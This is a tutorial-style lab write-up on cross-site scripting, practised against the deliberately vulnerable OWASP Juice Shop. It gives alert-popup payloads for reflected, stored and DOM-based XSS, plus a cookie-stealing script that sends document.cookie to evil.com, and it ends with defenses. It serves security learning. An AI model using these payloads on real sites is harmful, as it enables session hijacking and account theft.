# 🌐 Day 5 – Understanding and Exploiting Cross-Site Scripting (XSS)

## 🔹 Introduction

Today’s focus is on **Cross-Site Scripting (XSS)** — one of the **most common and dangerous web vulnerabilities**.

At its core, XSS is about tricking a web application into executing **malicious JavaScript** inside the victim’s browser.

Why is this scary?

Because if an attacker can run *any* code in your browser, they can:

- Steal your **cookies** or session tokens (account takeover).
- Modify the page you see (phishing, fake forms, redirecting).
- Spread malware.

Think of it like this:

👉 The website is the stage.

👉 The browser is the audience.

👉 XSS lets attackers sneak their own script into the play — and the audience believes it’s part of the original show.

---

## 🔹 Types of XSS

1. **Reflected XSS** (a one-time echo)
    - Payload is part of the request (URL, form input).
    - Reflected immediately in the response.
    - Works only when the victim clicks the crafted link.
    - 📖 *Analogy*: Shouting into a cave and hearing your own echo right back.
2. **Stored XSS** (a permanent trap)
    - Payload gets stored in the database or server.
    - Every visitor sees the malicious script.
    - 📖 *Analogy*: Graffiti sprayed on a public wall — everyone passing by sees it.
3. **DOM-Based XSS** (the client-side twist)
    - Payload is executed by client-side JavaScript, without touching the server.
    - Happens when developers manipulate the DOM with unsanitized input.
    - 📖 *Analogy*: Writing your own sticky note and slapping it onto the app’s UI — the system never knew it happened.

---

## 🔹 Our Lab Setup

We used **OWASP Juice Shop**, a purposely vulnerable web application, to practice exploiting XSS.

All attacks were carried out in a safe lab environment.

---

## 🔹 Practical Work

### 1. Reflected XSS

- **Payload used:**
    
    ```html
    <img src=x onerror=alert('XSS')>
    ```
    
- **Steps:**
    - Injected this payload into a search box.
    - Page reflected it back without escaping.
- **Result:**
    
    ✅ A popup appeared with **“XSS”**.
    
    - This proves the input was reflected directly into the page → unsafe.

---

### 2. Stored XSS

- **Payload used (Feedback form):**
    
    ```html
    <script>alert('DOMXSS')</script>
    ```
    
- **Steps:**
    - Submitted this in the feedback/comment form.
    - Juice Shop saved the payload in its database.
    - On returning to the feedback page, the payload executed.
- **Result:**
    
    ✅ Every visitor to that page saw a popup **“DOMXSS”**.
    
    - In the real world, this could mean malicious scripts running for *all users*, not just us.

---

### 3. DOM-Based XSS

- **Observation:**
    
    When testing dynamic JavaScript functions, we saw console logs and error traces:
    
    Then I tried:
    
    ```
    ERROR Error: NG04002: 'DOMXSS'
    ```
    
    Then I tried:
    
    ```
    http://localhost:3000/#/search?q=<iframe src=javascript:alert('DOMXSS')>
    ```
    
- **Result:**

✅ A popup also confirmed execution in some contexts.

- This shows the browser executed input directly in the **client-side DOM**, not through the server.

---

### 4. Theoretical Impact: Cookie Theft

- A dangerous payload could look like this:
    
    ```html
    <script>
    fetch("http://evil.com/steal?cookie=" + document.cookie)
    </script>
    ```
    
- If successful:
    - Attacker steals the victim’s session cookie.
    - Victim’s account can be hijacked.
- ⚠️ We did **not** run this in practice (unsafe), but it demonstrates the real power of XSS.

---

## 🔹 Why This Matters

XSS isn’t just about funny popups — it’s about **trust**.

- If I can run JavaScript on your banking app, I can empty your account.
- If I can inject scripts in your email app, I can phish your password.
- If I can modify what you see, I control your reality.

That’s why modern defenses exist:

- **Input validation** (never trust user input).
- **Output encoding** (escape special characters per context).
- **Content Security Policy (CSP)** to block inline scripts.

---

## 🔹 Key Takeaways

- **Reflected XSS** → Comes from the request.
- **Stored XSS** → Saved on the server, affects everyone.
- **DOM XSS** → Purely client-side, from JavaScript handling input.
- Even in a small demo, we saw how XSS could persist, reflect, and execute.
- Real-world impact goes far beyond alerts → session hijacking, data theft, and phishing.

---

## 🔹 Evidence from Our Lab

- Reflected XSS popup: **“XSS”** ✅
- Stored XSS popup: **“DOMXSS”** ✅
- DOM-based XSS console logs + popup ✅

---

## ✅ Conclusion

Today’s lesson on **Cross-Site Scripting** showed us not just how to exploit it, but also why it’s dangerous.

Every popup was proof that the browser was executing *our* code instead of just the website’s.

📌 For developers: Always validate and escape input in the right context.

📌 For learners: Never stop at “alert(1)” — always ask: *“What could an attacker do with this?”*